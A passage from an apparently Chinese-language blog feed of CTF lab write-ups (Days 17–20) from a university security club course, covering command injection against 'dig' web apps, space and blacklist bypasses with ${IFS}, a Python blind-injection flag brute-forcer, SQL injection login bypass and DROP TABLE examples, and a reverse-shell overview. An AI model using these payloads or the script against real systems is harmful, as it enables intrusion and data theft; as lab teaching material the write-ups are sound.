aria-hidden="true">Image</figcaption></figure><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">result:</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, send_file</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">'/'</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">'home.html'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">'/howtogen'</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">howtogen</span>():</span><br><span class="line"><span class="keyword">return</span> send_file(<span class="string">'gen.py'</span>, mimetype=<span class="string">'text/plain'</span>, as_attachment=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">'/hint'</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hint</span>():</span><br><span class="line"><span class="keyword">return</span> send_file(<span class="string">'Dockerfile'</span>, mimetype=<span class="string">'text/plain'</span>, as_attachment=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">'/gen'</span>, methods=[<span class="string">'GET'</span>, <span class="string">'POST'</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_input</span>():</span><br><span class="line">message = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">user_input = request.form[<span class="string">'user_input'</span>]</span><br><span class="line"><span class="keyword">if</span> <span class="string">" "</span> <span class="keyword">in</span> user_input:</span><br><span class="line">result = <span class="string">"evil input"</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">result = subprocess.run(</span><br><span class="line"><span class="string">f"python gen.py <span class="subst">{user_input}</span>"</span>, shell=<span class="literal">True</span>, capture_output=<span class="literal">True</span>, text=<span class="literal">True</span>).stdout.replace(<span class="string">'\', '</span><span class="string">')</span></span><br><span class="line"><span class="string">message = f"result: {result}"</span></span><br><span class="line"><span class="string">return render_template('</span>generate.html<span class="string">', message=message)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if __name__ == "__main__":</span></span><br><span class="line"><span class="string">app.run(host='</span><span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span><span class="string">', port=5050)</span></span><br></pre></td></tr></tbody></table></figure><p>可以知道不能輸入空白，另外還有他執行程式的方法是</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">subprocess.run(</span><br><span class="line"><span class="string">f"python gen.py <span class="subst">{user_input}</span>"</span>, shell=<span class="literal">True</span>, capture_output=<span class="literal">True</span>, text=<span class="literal">True</span>).stdout.replace(<span class="string">'\', '</span><span class="string">')</span></span><br></pre></td></tr></tbody></table></figure><p>可以讓我們利用類似 <code>;id</code> 這樣的方式來達到 RCE，空白就用<code>${IFS}</code> 來代替，隨便戳戳看之後就能拿到 Flag 了</p><figure><img data-src="https://i.imgur.com/bsNKWDc.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/ea7xOKB.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/NXWwza5.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h2 id="參考資料">參考資料 <a href="#參考資料" class="headerlink"></a></h2><ul><li><a href="https://youtu.be/-cMOv9QudOk?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】手把手 Python 教學— 從入門到入侵</a></li><li><a href="https://youtu.be/N60VGmhfhy0?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】WEB1</a></li><li><a href="https://youtu.be/PqydmB-IoYc?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】WEB2</a></li><li><a href="https://youtu.be/xjnAnrfApJo?list=PLFFwfkaPB2mqsfIQvdoT6xc0CziXhmrEV">【成大資安社社課】不是 web3.0 的web3 - Vincent55</a></li><li><a href="https://youtu.be/nVXA9S9Y07M?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】Crypto1</a></li><li><a href="https://youtu.be/LtWiQxbMjwg?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】Crypto2</a></li><li><a href="https://youtu.be/8WVrUqjBsRE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】Linux基礎指令與使用者管理</a></li><li><a href="https://youtu.be/pNhHXhPkNcE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】淺談網路與H T T P</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;前言 &lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot;&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;本日進度：&lt;/p&gt;
&lt;ul class=&quot;task-list&quot;&gt;
&lt;li&gt;&lt;label&gt;&lt;input type=&quot;checkbox&quot; checked=&quot;&quot;&gt;&lt;a href=&quot;https://youtu.be/PqydmB-IoYc?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z&quot;&gt;【成大資安社社課】WEB
2 - Lab&lt;/a&gt;&lt;/label&gt;&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="IThome 2024 鐵人賽" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
    <category term="一直刷 CTF" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/%E4%B8%80%E7%9B%B4%E5%88%B7-CTF/"/>
    
    
    <category term="資安" scheme="https://moon-jam.me/tags/%E8%B3%87%E5%AE%89/"/>
    
    <category term="CTF" scheme="https://moon-jam.me/tags/CTF/"/>
    
    <category term="IThome 2024 鐵人賽" scheme="https://moon-jam.me/tags/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
  </entry>
  
  <entry>
    <title>IThome 2024 鐵人賽 一直刷 CTF - Day19</title>
    <link href="https://moon-jam.me/IThome_2024ironman_CTF_Day19/"/>
    <id>https://moon-jam.me/IThome_2024ironman_CTF_Day19/</id>
    <published>2024-09-21T16:00:00.000Z</published>
    <updated>2025-08-19T09:24:30.306Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言">前言 <a href="#前言" class="headerlink"></a></h2><p>本日進度：</p><ul class="task-list"><li><label><input type="checkbox" checked=""><a href="https://youtu.be/PqydmB-IoYc?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】WEB2 - Lab</a></label></li></ul><span id="more"></span><h3 id="lab-login">Lab-login <a href="#lab-login" class="headerlink"></a></h3><p>題目很好心把他會查詢的指令列出來了，可以發現他都有用 <code>()</code>包起來，所以截斷的時候要注意要把 <code>)</code> 也帶上，就能順利Injection 了。</p><figure><img data-src="https://i.imgur.com/IDavAlE.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/LO1unj3.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="dig-arguments">Dig Arguments <a href="#dig-arguments" class="headerlink"></a></h3><p>他有提供網站的原始碼，是用 flask 建的，下面這個是主要邏輯</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">"/"</span>, methods=[<span class="string">"GET"</span>, <span class="string">"POST"</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dig</span>():</span><br><span class="line">    dig_result = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">"debug"</span>):</span><br><span class="line">        <span class="keyword">return</span> send_file(__name__ + <span class="string">".py"</span>)</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">"POST"</span>:</span><br><span class="line">        hostname1 = request.form[<span class="string">"hostname1"</span>]</span><br><span class="line">        hostname2 = request.form[<span class="string">"hostname2"</span>]</span><br><span class="line">        process = subprocess.Popen(</span><br><span class="line">            [<span class="string">"dig"</span>, hostname1, hostname2],</span><br><span class="line">            stdout=subprocess.PIPE,</span><br><span class="line">            stderr=subprocess.PIPE,</span><br><span class="line">        )</span><br><span class="line">        output, _ = process.communicate()</span><br><span class="line">        dig_result = output.decode()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"index.html"</span>, request=request, dig_result=dig_result)</span><br></pre></td></tr></tbody></table></figure><p><code>["dig", hostname1, hostname2]</code> 這樣的寫法會讓我們打算injection</p><p>講師給了一個 <a href="https://gtfobins.github.io/">酷酷網站</a>，可以查到很多利用一些<code>本來應該不是用來讀檔或執行指令的</code>的指令來 bypass 的方法，就找到了這個東東，按照這個方法就可以讀到 flag了。</p><figure><img data-src="https://i.imgur.com/rxkhZup.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/uKjFGSo.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h2 id="參考資料">參考資料 <a href="#參考資料" class="headerlink"></a></h2><ul><li><a href="https://youtu.be/-cMOv9QudOk?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】手把手 Python 教學— 從入門到入侵</a></li><li><a href="https://youtu.be/N60VGmhfhy0?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】WEB1</a></li><li><a href="https://youtu.be/PqydmB-IoYc?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】WEB2</a></li><li><a href="https://youtu.be/xjnAnrfApJo?list=PLFFwfkaPB2mqsfIQvdoT6xc0CziXhmrEV">【成大資安社社課】不是 web3.0 的web3 - Vincent55</a></li><li><a href="https://youtu.be/nVXA9S9Y07M?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】Crypto1</a></li><li><a href="https://youtu.be/LtWiQxbMjwg?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】Crypto2</a></li><li><a href="https://youtu.be/8WVrUqjBsRE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】Linux基礎指令與使用者管理</a></li><li><a href="https://youtu.be/pNhHXhPkNcE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】淺談網路與H T T P</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;前言 &lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot;&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;本日進度：&lt;/p&gt;
&lt;ul class=&quot;task-list&quot;&gt;
&lt;li&gt;&lt;label&gt;&lt;input type=&quot;checkbox&quot; checked=&quot;&quot;&gt;&lt;a href=&quot;https://youtu.be/PqydmB-IoYc?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z&quot;&gt;【成大資安社社課】WEB
2 - Lab&lt;/a&gt;&lt;/label&gt;&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="IThome 2024 鐵人賽" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
    <category term="一直刷 CTF" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/%E4%B8%80%E7%9B%B4%E5%88%B7-CTF/"/>
    
    
    <category term="資安" scheme="https://moon-jam.me/tags/%E8%B3%87%E5%AE%89/"/>
    
    <category term="CTF" scheme="https://moon-jam.me/tags/CTF/"/>
    
    <category term="IThome 2024 鐵人賽" scheme="https://moon-jam.me/tags/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
  </entry>
  
  <entry>
    <title>IThome 2024 鐵人賽 一直刷 CTF - Day18</title>
    <link href="https://moon-jam.me/IThome_2024ironman_CTF_Day18/"/>
    <id>https://moon-jam.me/IThome_2024ironman_CTF_Day18/</id>
    <published>2024-09-20T16:00:00.000Z</published>
    <updated>2025-08-19T09:24:30.306Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言">前言 <a href="#前言" class="headerlink"></a></h2><p>本日進度：</p><ul class="task-list"><li><label><input type="checkbox" checked=""><a href="https://youtu.be/PqydmB-IoYc?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】WEB2 - lab</a></label></li></ul><span id="more"></span><h2 id="上課紀錄">上課紀錄 <a href="#上課紀錄" class="headerlink"></a></h2><h3 id="lab---dig-blind">Lab - dig-blind <a href="#lab---dig-blind" class="headerlink"></a></h3><p>他只會回傳 <code>success</code> 和 <code>fail</code>，先試試看<code>'; grep -q "NCKUCTF{d19_" /fl* &amp;&amp; exit 0 || exit 1'</code>，好欸，他回傳 <code>success</code> !!!!</p><p>但每一位都用人工猜有點太慢，可以寫個程式根據他回傳的 0 1 訊號反推flag ，最笨的方法就是直接一個個慢慢枚舉，這樣複雜度會是 O (NK) ， N是字串長度，K 是枚舉的字元集數量，根據之前的觀察字元集應該是<code>0123456789abcdefghijklmnopqrstuvwxyz_!{}</code>，雖然我想到比較好的方法是把每個字轉 ASCII，再用二進位表示，這樣就只會最多 7 次就知道那一個字是啥了，能壓到O (N)，但這樣寫有點累，而且字元集也不算太多，要是真的不行就再拿多執行緒來用也可以變成O (N)</p><p>我的 python 程式碼：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://140.116.246.59:28116/"</span></span><br><span class="line">prefix = <span class="string">"NCKUCTF{d19_"</span>  </span><br><span class="line">charset = <span class="string">"0123456789abcdefghijklmnopqrstuvwxyz_!}"</span>  </span><br><span class="line">flag = prefix</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> flag.endswith(<span class="string">"}"</span>):</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> charset:</span><br><span class="line">        payload = <span class="string">f"'; grep -q \"<span class="subst">{flag + char}</span>\" /fl* &amp;&amp; exit 0 || exit 1'"</span></span><br><span class="line">        data = {<span class="string">'name'</span>: payload}</span><br><span class="line">        </span><br><span class="line">        response = requests.post(url, data=data)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> response.text.count(<span class="string">"success"</span>) == <span class="number">2</span>:</span><br><span class="line">            flag += char</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f"Found: <span class="subst">{flag}</span>"</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"Final Flag: <span class="subst">{flag}</span>"</span>)</span><br></pre></td></tr></tbody></table></figure><figure><img data-src="https://i.imgur.com/N6PEcTz.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h2 id="參考資料">參考資料 <a href="#參考資料" class="headerlink"></a></h2><ul><li><a href="https://youtu.be/-cMOv9QudOk?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】手把手 Python 教學— 從入門到入侵</a></li><li><a href="https://youtu.be/N60VGmhfhy0?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】WEB1</a></li><li><a href="https://youtu.be/PqydmB-IoYc?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】WEB2</a></li><li><a href="https://youtu.be/xjnAnrfApJo?list=PLFFwfkaPB2mqsfIQvdoT6xc0CziXhmrEV">【成大資安社社課】不是 web3.0 的web3 - Vincent55</a></li><li><a href="https://youtu.be/nVXA9S9Y07M?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】Crypto1</a></li><li><a href="https://youtu.be/LtWiQxbMjwg?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】Crypto2</a></li><li><a href="https://youtu.be/8WVrUqjBsRE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】Linux基礎指令與使用者管理</a></li><li><a href="https://youtu.be/pNhHXhPkNcE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】淺談網路與H T T P</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;前言 &lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot;&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;本日進度：&lt;/p&gt;
&lt;ul class=&quot;task-list&quot;&gt;
&lt;li&gt;&lt;label&gt;&lt;input type=&quot;checkbox&quot; checked=&quot;&quot;&gt;&lt;a href=&quot;https://youtu.be/PqydmB-IoYc?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z&quot;&gt;【成大資安社社課】WEB
2 - lab&lt;/a&gt;&lt;/label&gt;&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="IThome 2024 鐵人賽" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
    <category term="一直刷 CTF" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/%E4%B8%80%E7%9B%B4%E5%88%B7-CTF/"/>
    
    
    <category term="資安" scheme="https://moon-jam.me/tags/%E8%B3%87%E5%AE%89/"/>
    
    <category term="CTF" scheme="https://moon-jam.me/tags/CTF/"/>
    
    <category term="IThome 2024 鐵人賽" scheme="https://moon-jam.me/tags/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
  </entry>
  
  <entry>
    <title>IThome 2024 鐵人賽 一直刷 CTF - Day17</title>
    <link href="https://moon-jam.me/IThome_2024ironman_CTF_Day17/"/>
    <id>https://moon-jam.me/IThome_2024ironman_CTF_Day17/</id>
    <published>2024-09-19T16:00:00.000Z</published>
    <updated>2025-08-19T09:24:30.306Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言">前言 <a href="#前言" class="headerlink"></a></h2><p>本日進度：</p><ul class="task-list"><li><label><input type="checkbox" checked=""><a href="https://youtu.be/PqydmB-IoYc?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】WEB2 - 完</a></label></li></ul><span id="more"></span><h2 id="上課紀錄">上課紀錄 <a href="#上課紀錄" class="headerlink"></a></h2><h3 id="injection-駭客的填字遊戲">Injection (駭客的填字遊戲) <a href="#injection-駭客的填字遊戲" class="headerlink"></a></h3><figure><img data-src="https://i.imgur.com/y5iWGg3.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>把所有車牌都刪掉了 xddd</p><figure><img data-src="https://i.imgur.com/WIwk4gl.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p><a href="https://youtu.be/WWJTsKaJT_g?si=Q3cZWVAqUkfB6Cvg">讚讚的影片說明</a></p><p>這次會提到的</p><figure><img data-src="https://i.imgur.com/3WVKgr6.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h4 id="code-injection">Code Injection <a href="#code-injection" class="headerlink"></a></h4><p>以 python eval 舉例</p><figure><img data-src="https://i.imgur.com/logfdq8.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>其他常見的危險函式</p><figure><img data-src="https://i.imgur.com/sJZbGSw.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>如何預防?</p><p>可以看看 <a href="https://github.com/odoo/odoo/blob/17.0/odoo/tools/safe_eval.py">這個</a></p><p>Code Injection 常常會出現在 IOT 設備 (像是監視器、TX link 之類的)</p><h4 id="command-injection">Command Injection <a href="#command-injection" class="headerlink"></a></h4><figure><img data-src="https://i.imgur.com/fizUAJk.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>指令就會變成 <code>dig vincent55.tw; id</code></p><p>基本技巧 <code>;</code> <code>|</code> <code>&amp;&amp;</code><code>||</code></p><figure><img data-src="https://i.imgur.com/ggJZvGk.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>command substitution</p><figure><img data-src="https://i.imgur.com/mCveGNN.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>如果空白被過濾了 - 用 <code>${IFS}</code> / <code>&lt;</code></p><figure><img data-src="https://i.imgur.com/MCQKUP0.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>如果有一些 keyword 被過濾了</p><figure><img data-src="https://i.imgur.com/69MmYeJ.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="lab---dig">Lab - dig <a href="#lab---dig" class="headerlink"></a></h3><p>這題她有提供原始碼，可以知道背後的執行邏輯是<code>&lt;pre&gt;&lt;?= system("dig '" . $_POST['name'] . "';") ?&gt;&lt;/pre&gt;</code>，所以可以用 <code>';</code> 來截斷 <code>dig</code>然後就能在後面輸入想要的指令了，先用 <code>ls</code> 找到 Flag的位置，然後再印出來就是答案摟</p><figure><img data-src="https://i.imgur.com/t4QVkPM.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/9p1z9dA.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="lab---dig-waf1">Lab - dig waf1 <a href="#lab---dig-waf1" class="headerlink"></a></h3><p>這題多檔了一些字<code>blacklist = ['|', '&amp;', ';', '&gt;', '&lt;', "\n", 'flag'];</code>，可以用之前的 code substitution 來繞過</p><figure><img data-src="https://i.imgur.com/aWF3spJ.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="lab---dig-waf2">Lab - dig waf2 <a href="#lab---dig-waf2" class="headerlink"></a></h3><p>這題多檔了空白，用 <code>${IFS}</code> 就能通過了</p><figure><img data-src="https://i.imgur.com/Boo8ori.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="reverse-shell">Reverse shell <a href="#reverse-shell" class="headerlink"></a></h3><p>Normal shell: ssh</p><figure><img data-src="https://i.imgur.com/c5gRgjw.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>Reverse shell 就是改成從 server 主動連線到 client</p><figure><img data-src="https://i.imgur.com/2MRqmS8.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/rzza9V9.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p><a href="https://www.revshells.com/">這邊</a> 有各種不同的 reverseshell</p><p><a href="https://ngrok.com/download">ngrok</a>可以用來反向代理，這樣如果連成大網路就不會被擋一些東西了</p><h3 id="sql-injection">SQL Injection <a href="#sql-injection" class="headerlink"></a></h3><p>簡介</p><figure><img data-src="https://i.imgur.com/jCbLoYT.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/diIYRxW.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/W0VqYqh.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p><code>SELECT title, subtitle, context FROM articles;</code><br>這邊是要找出 title, subtitle, context 這三個欄位的資料</p><figure><img data-src="https://i.imgur.com/Eo7UdZC.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p><code>SELECT * FROM articles;</code><br>找出所有欄位的資料</p><figure><img data-src="https://i.imgur.com/haP21Dv.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p><code>SELECT * FROM articles WHERE id = 2;</code><br>找出 id 為 2 的資料</p><figure><img data-src="https://i.imgur.com/PZOX4J1.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>這邊就有點像是前面 command injection一樣，可以讓他做一些壞壞的事情</p><p><code>SELECT * FROM articles WHERE id = 3; DROP TABLE articles;</code></p><figure><img data-src="https://i.imgur.com/PSaEbhN.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>另外如果是在處理登入的資料庫是用<code>SELECT * FROM user='' AND pass=</code>來做判斷帳密是否正確，那就有可能發生下面一張的問題</p><figure><img data-src="https://i.imgur.com/ddMisBO.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>藉由 <code>'</code> 截斷 和 <code>--</code>註解的方式，可以讓他不管密碼是什麼的狀況下登入</p><figure><img data-src="https://i.imgur.com/3MtXInv.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>分類</p><ul><li>Stacked: 用分號隔開各種語句</li><li>Union Based: 用 UNION 來將兩個語句合在一起</li><li>Blind Based: 當目標不會告訴你 result 的時候<ul><li>Time Based: 透過 sleep 來判斷條件</li><li>Boolean Based: 透過布林結果來判斷條件</li></ul></li><li>Error Based: 透過錯誤訊息來取得資料</li><li>Out of Band: 讀檔、寫檔…</li></ul><h2 id="參考資料">參考資料 <a href="#參考資料" class="headerlink"></a></h2><ul><li><a href="https://youtu.be/-cMOv9QudOk?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】手把手 Python 教學— 從入門到入侵</a></li><li><a href="https://youtu.be/N60VGmhfhy0?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】WEB1</a></li><li><a href="https://youtu.be/PqydmB-IoYc?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】WEB2</a></li><li><a href="https://youtu.be/xjnAnrfApJo?list=PLFFwfkaPB2mqsfIQvdoT6xc0CziXhmrEV">【成大資安社社課】不是 web3.0 的web3 - Vincent55</a></li><li><a href="https://youtu.be/nVXA9S9Y07M?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】Crypto1</a></li><li><a href="https://youtu.be/LtWiQxbMjwg?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】Crypto2</a></li><li><a href="https://youtu.be/8WVrUqjBsRE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】Linux基礎指令與使用者管理</a></li><li><a href="https://youtu.be/pNhHXhPkNcE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】淺談網路與H T T P</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;前言 &lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot;&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;本日進度：&lt;/p&gt;
&lt;ul class=&quot;task-list&quot;&gt;
&lt;li&gt;&lt;label&gt;&lt;input type=&quot;checkbox&quot; checked=&quot;&quot;&gt;&lt;a href=&quot;https://youtu.be/PqydmB-IoYc?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z&quot;&gt;【成大資安社社課】WEB
2 - 完&lt;/a&gt;&lt;/label&gt;&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="IThome 2024 鐵人賽" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
    <category term="一直刷 CTF" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/%E4%B8%80%E7%9B%B4%E5%88%B7-CTF/"/>
    
    
    <category term="資安" scheme="https://moon-jam.me/tags/%E8%B3%87%E5%AE%89/"/>
    
    <category term="CTF" scheme="https://moon-jam.me/tags/CTF/"/>
    
    <category term="IThome 2024 鐵人賽" scheme="https://moon-jam.me/tags/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
  </entry>
  
  <entry>
    <title>IThome 2024 鐵人賽 一直刷 CTF - Day16</title>
